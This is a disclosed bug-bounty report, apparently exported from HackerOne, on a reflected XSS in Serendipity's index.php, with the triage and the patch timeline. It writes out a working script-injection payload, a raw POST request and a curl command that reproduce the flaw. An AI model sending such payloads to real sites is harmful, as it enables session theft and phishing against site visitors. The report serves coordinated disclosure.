{"id":374100,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzQxMDA=","url":"https://hackerone.com/reports/374100","title":"Reflected xss in Serendipity's /index.php","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-06-30T00:27:29.148Z","submitted_at":"2018-06-30T00:27:29.148Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"geeknik","url":"/geeknik","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30278,"url":"https://hackerone.com/hannob","handle":"hannob","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/278/97035f061f6de55a9362b39edae4f5948bda6735_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/278/97035f061f6de55a9362b39edae4f5948bda6735_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Hanno's projects","twitter_handle":"hanno","website":"https://hboeck.de/","about":"Personal web projects from Hanno BÃ¶ck."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-09T21:03:03.465Z","bug_reporter_agreed_on_going_public_at":"2018-11-09T21:03:03.402Z","team_member_agreed_on_going_public_at":"2018-11-09T14:36:53.742Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nThere exists a reflected xss threat in https://blog.fuzzing-project.org/index.php?frontpage. \n\n**Description:**\nBy setting the `serendipity%5bmultiCat%5d%5b%5d` POST input to `1'\"()\u0026%\u003c%20\u003e\u003cScRiPt \u003eprompt(1)\u003c/ScRiPt\u003e` I'm able to trigger a JavaScript prompt box in versions of IE up to and including IE 11.\n\n## Steps To Reproduce:\nThis POST request should replicate the issue:\n\n```\nPOST /index.php?frontpage HTTP/1.1\nContent-Length: 118\nContent-Type: application/x-www-form-urlencoded\nReferer: https://blog.fuzzing-project.org/\nCookie: s9y_320982y345h324j56e04069=78uvbj9fk2u4jyh562u3j46jdt81tod; serendipity[url]=1; serendipity[name]=ltociaay; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22\nHost: blog.fuzzing-project.org\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\n\nserendipity%5bisMultiCat%5d=Go%21\u0026serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25\u003c%20\u003e\u003cScRiPt%20\u003eprompt(1)\u003c/ScRiPt\u003e\n```\nAnd here we can see that is reflected back to us in Serendipity's pagination block:\n```\n\u003cnav class=\"serendipity_pagination block_level\"\u003e\n        \u003ch2 class=\"visuallyhidden\"\u003ePagination\u003c/h2\u003e\n\n        \u003cul class=\"clearfix\"\u003e\n                        \u003cli class=\"info\"\u003e\u003cspan\u003ePage 1 of 3, totaling 34 entries\u003c/span\u003e\u003c/li\u003e\n                        \u003cli class=\"prev\"\u003e\u0026nbsp;\u003c/li\u003e\n            \u003cli class=\"next\"\u003e\u003ca href=\"https://blog.fuzzing-project.org/categories/1\\'\\\"()\u0026%\u003c%20\u003e\u003cScRiPt \u003eprompt(1)\u003c/ScRiPt\u003e-multi/P2.html\"\u003enext page \u0026rarr;\u003c/a\u003e\u003c/li\u003e\n        \u003c/ul\u003e\n    \u003c/nav\n```\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Impact\n\nOnce the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as \"drive-by hacking.\"\n\nIn many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-12-09T14:36:53.781Z","allow_singular_disclosure_after":-89597732.46077628,"singular_disclosure_allowed":true,"vote_count":7,"voters":["sameerphad72","ali","geeknik","eveeez","spetr0x","gurigill0037","supremegoddess"],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":11140,"asset_type":"URL","asset_identifier":"*.fuzzing-project.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2988501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't manage to reproduce this, it may be due to urlencoding issues. Can you provide a reproducer html (with a simple form) or a curl command?\n\n(I don't particularly care if the script will actually execute in a browser or blocked by the XSS filter, as long as it reflects the script tag content I'll consider it a valid bug.)","automated_response":false,"created_at":"2018-07-04T17:02:03.435Z","updated_at":"2018-07-04T17:02:03.435Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2988870,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Try this: \n`curl -s --data \"serendipity%5bisMultiCat%5d=Go%21\u0026serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25\u003c%20\u003e\u003cScRiPt%20\u003eprompt(1)\u003c/ScRiPt\u003e\" \"https://blog.fuzzing-project.org/index.php?frontpage\" | grep prompt`\n\nWhich should result in a response like so:\n\n```\n\u003cli class=\"next\"\u003e\u003ca href=\"https://blog.fuzzing-project.org/categories/1\\'\\\"()\u0026%\u003c \u003e\u003cScRiPt \u003eprompt(1)\u003c/ScRiPt\u003e-multi/P2.html\"\u003enext page \u0026rarr;\u003c/a\u003e\u003c/li\u003e\n```","automated_response":false,"created_at":"2018-07-04T19:34:52.669Z","updated_at":"2018-07-04T19:34:52.669Z","actor":{"username":"geeknik","cleared":false,"url":"/geeknik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2990093,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Preliminary patch, and reported to Serendipity developers. Thanks.","automated_response":false,"created_at":"2018-07-05T07:32:29.301Z","updated_at":"2018-07-05T07:32:29.301Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":315909,"filename":"H1S9Y-XSS-2.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/315/909/7a7282e5d565e549931e66411716e1d6217e05dd/H1S9Y-XSS-2.diff?response-content-disposition=attachment%3B%20filename%3D%22H1S9Y-XSS-2.diff%22%3B%20filename%2A%3DUTF-8%27%27H1S9Y-XSS-2.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145226Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6ba076f2b36ed43a04719902e88e6bc9e147018ffecb878ad337ce5bd93a1eb3"}],"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3063066,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is now fixed with a patch I got from s9y's dev (as should be all other open issues).\nI'd appreciate if you could check that and also look for further issues, s9y will soon release a security update.","automated_response":false,"created_at":"2018-07-18T17:37:40.288Z","updated_at":"2018-07-18T17:37:40.288Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3068272,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This xss looks fixed to me and I haven't found any additional bugs at this time.","automated_response":false,"created_at":"2018-07-19T10:50:02.087Z","updated_at":"2018-07-19T10:50:02.087Z","actor":{"username":"geeknik","cleared":false,"url":"/geeknik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3203963,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Fixed with serendipity 2.1.3: http://blog.s9y.org/archives/278-Serendipity-2.1.3-released.html\n(release notes don't mention the fix, but it's in)","automated_response":false,"created_at":"2018-08-16T13:34:54.648Z","updated_at":"2018-08-16T13:34:54.648Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"geeknik","url":"/geeknik"},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3205714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yay for the fix, boo for the lack of credit by the author.","automated_response":false,"created_at":"2018-08-16T18:40:29.244Z","updated_at":"2018-08-16T18:40:29.244Z","actor":{"username":"geeknik","cleared":false,"url":"/geeknik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3208465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Actually it seems there's been a communication hiccup. This is not fixed yet in upstream s9y and thus also the lack of credit. Will keep you updated.","automated_response":false,"created_at":"2018-08-17T08:41:50.240Z","updated_at":"2018-08-17T08:41:50.240Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3396085,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, finally fixed in serendipity 2.1.4, and with proper credit:\nhttp://blog.s9y.org/archives/280-Serendipity-2.1.4-and-2.2.1-alpha1-released.html","automated_response":false,"created_at":"2018-09-27T08:52:35.638Z","updated_at":"2018-09-27T08:52:35.638Z","actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3617245,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-09T14:36:53.761Z","updated_at":"2018-11-09T14:36:53.761Z","first_to_agree":true,"actor":{"username":"hanno","cleared":false,"url":"/hanno","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3620590,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-09T21:03:03.427Z","updated_at":"2018-11-09T21:03:03.427Z","actor":{"username":"geeknik","cleared":false,"url":"/geeknik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3620591,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-11-09T21:03:03.490Z","updated_at":"2018-11-09T21:03:03.490Z","actor":{"username":"geeknik","cleared":false,"url":"/geeknik","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hannob","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":10817,"category":"team","content":"Reporter found a reflected XSS in a blog running with the software Serendipity. This was a valid report of a significant security vulnerability.\n\nThis was fixed by the Serendipity developers in version 2.1.4:\nhttp://blog.s9y.org/archives/280-Serendipity-2.1.4-and-2.2.1-alpha1-released.html\n\nAll affected blogs that I operate have been updated to that version.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":20918,"username":"hanno","name":"Hanno BÃ¶ck","bio":"","cleared":false,"website":"https://hboeck.de/","location":"","created_at":"2015-04-21T23:34:53.960Z","url":"https://hackerone.com/hanno","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/020/918/74da560ef66bf8cc239e219843444b441a7dfac6_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}